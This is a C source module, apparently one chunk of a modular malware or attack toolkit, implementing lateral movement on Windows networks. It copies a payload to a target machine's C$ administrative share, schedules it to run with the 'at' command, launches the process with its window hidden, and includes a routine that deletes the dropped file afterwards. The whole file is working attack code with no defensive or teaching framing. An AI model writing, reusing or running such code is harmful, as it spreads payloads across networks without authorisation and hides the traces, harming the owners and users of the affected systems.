// chunk: lateral/smb_exec
// depends: (none)
// provides: lateral_smb
// headers: windows.h
// note: Execute payload via SMB share copy + at job (legacy method)

#ifndef CHUNK_LATERAL_SMB_EXEC
#define CHUNK_LATERAL_SMB_EXEC

static int lateral_smb(const char *target_host, const char *payload_path,
                       const char *remote_filename) {
    char remote_share[512];
    snprintf(remote_share, sizeof(remote_share), "\\\\%s\\C$\\Windows\\Temp\\%s",
             target_host, remote_filename);

    if (!CopyFileA(payload_path, remote_share, FALSE)) {
        return 0;
    }

    SYSTEMTIME st;
    GetLocalTime(&st);
    st.wMinute += 1;
    if (st.wMinute >= 60) {
        st.wMinute -= 60;
        st.wHour += 1;
    }

    char at_cmd[1024];
    snprintf(at_cmd, sizeof(at_cmd),
             "at \\\\%s %02d:%02d \"C:\\Windows\\Temp\\%s\"",
             target_host, st.wHour, st.wMinute, remote_filename);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (!CreateProcessA(NULL, at_cmd, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        DeleteFileA(remote_share);
        return 0;
    }

    WaitForSingleObject(pi.hProcess, 10000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 1;
}

static int lateral_smb_cleanup(const char *target_host, const char *remote_filename) {
    char remote_share[512];
    snprintf(remote_share, sizeof(remote_share), "\\\\%s\\C$\\Windows\\Temp\\%s",
             target_host, remote_filename);
    DeleteFileA(remote_share);
    return 1;
}

#endif
